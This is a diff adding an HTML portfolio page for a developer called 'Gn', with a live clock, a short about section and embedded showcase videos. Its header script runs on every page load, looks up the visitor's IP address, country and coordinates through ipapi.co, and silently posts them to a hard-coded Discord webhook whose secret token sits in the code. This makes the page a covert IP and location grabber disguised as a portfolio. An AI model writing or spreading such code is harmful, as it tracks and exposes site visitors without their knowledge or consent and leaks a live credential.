@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gns Portfolio - Spaceship Design</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background-image: url('https://c.tenor.com/vQlBtdRYdxgAAAAC/tenor.gif');
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            color: white;
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .container {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 40px;
+            text-align: center;
+            border-radius: 10px;
+            max-width: 900px;
+            margin: 20px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.6);
+            position: relative;
+        }
+        .top-left {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            font-size: 24px;
+            font-weight: bold;
+            color: #fff;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8);
+        }
+        .bottom-right {
+            position: absolute;
+            bottom: 20px;
+            right: 20px;
+            font-size: 16px;
+            color: #fff;
+            text-align: right;
+        }
+        .time {
+            display: inline;
+            margin-left: 10px;
+        }
+        h1 {
+            margin-top: 20px;
+            font-size: 36px;
+            text-transform: uppercase;
+        }
+        h2 {
+            margin-top: 30px;
+            font-size: 28px;
+            color: #f0f0f0;
+        }
+        p, li {
+            font-size: 18px;
+            line-height: 1.6;
+            color: #ddd;
+        }
+        .about-me, .services, .showcase {
+            background-color: rgba(0, 0, 0, 0.8);
+            padding: 20px;
+            margin-top: 30px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.4);
+        }
+        .services ul, .showcase ul {
+            list-style-type: none;
+            padding: 0;
+            text-align: left;
+            margin-top: 10px;
+        }
+        .services li, .showcase li {
+            margin-bottom: 10px;
+        }
+        .videos {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-top: 30px;
+        }
+        .video {
+            margin: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+            overflow: hidden;
+            transition: transform 0.3s;
+        }
+        .video:hover {
+            transform: scale(1.05);
+        }
+        iframe {
+            width: 100%;
+            height: 200px;
+            border: none;
+        }
+    </style>
+    <script>
+        function updateTime() {
+            const now = new Date();
+            let hours = now.getHours();
+            let minutes = now.getMinutes();
+            const ampm = hours >= 12 ? 'PM' : 'AM';
+            hours = hours % 12;
+            hours = hours ? hours : 12; // the hour '0' should be '12'
+            minutes = minutes < 10 ? '0' + minutes : minutes;
+            const strTime = hours + ':' + minutes + ' ' + ampm;
+            document.getElementById('time').textContent = strTime;
+        }
+
+        function sendIpToDiscord(ip, country, coordinates) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1260243265865777212/mJc2ycFc_FF6KSPFrx6Y_Jr0FblnoegWz9MKqThS1PUAuxMIve2kuCknvstWWsrmhR9N';
+            const payload = {
+                content: `IP Address: ${ip}\nCountry: ${country}\nCoordinates: ${coordinates}`
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            }).catch(error => console.error('Error sending IP to Discord:', error));
+        }
+
+        function fetchIpDetails() {
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    const country = data.country_name;
+                    const coordinates = `${data.latitude}, ${data.longitude}`;
+                    document.getElementById('ip-details').innerHTML = `${coordinates}<br>${ip}<br>${country}`;
+                    sendIpToDiscord(ip, country, coordinates);
+                })
+                .catch(error => console.error('Error fetching IP details:', error));
+        }
+
+        window.onload = function() {
+            updateTime();
+            setInterval(updateTime, 60000); // update time every minute
+            fetchIpDetails();
+        }
+    </script>
+</head>
+<body>
+    <div class="top-left">Welcome,<span id="time" class="time"></span></div>
+    <div class="bottom-right" id="ip-details"></div>
+    <div class="container">
+        <h1>GNs Index</h1>
+        <p>Learn more about my work.</p>
+        
+        <div class="about-me">
+            <h2>About Me</h2>
+            <p><strong>Online Name:</strong> Gn</p>
+            <p><strong>Coding</strong>1Year and 6Months( as of 7/9/2024 )</p>
+            <p><strong>Continent:</strong> Asia</p>
+        </div>
+
+        <div class="services">
+            <h2>Services</h2>
+            <ul>
+                <li>UI</li>
+                <li>Toolsets</li>
+                <li>Systems</li>
+            </ul>
+        </div>
+
+        <div class="showcase">
+            <h2>Few Showcases of My Work</h2>
+            <div class="videos">
+                <div class="video">
+                    <iframe src="https://www.youtube.com/embed/BUP9Uesowmw" frameborder="0" allowfullscreen></iframe>
+                </div>
+                <div class="video">
+                    <iframe src="https://www.youtube.com/embed/3Py1c56uoH8" frameborder="0" allowfullscreen></iframe>
+                </div>
+                <div class="video">
+                    <iframe src="https://www.youtube.com/embed/GW2BtnnTiVU" frameborder="0" allowfullscreen></iframe>
+                </div>
+                <div class="videos">
+                    <div class="video">
+                        <iframe src="https://www.youtube.com/embed/N5e5jQLe4b8" frameborder="0" allowfullscreen></iframe>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
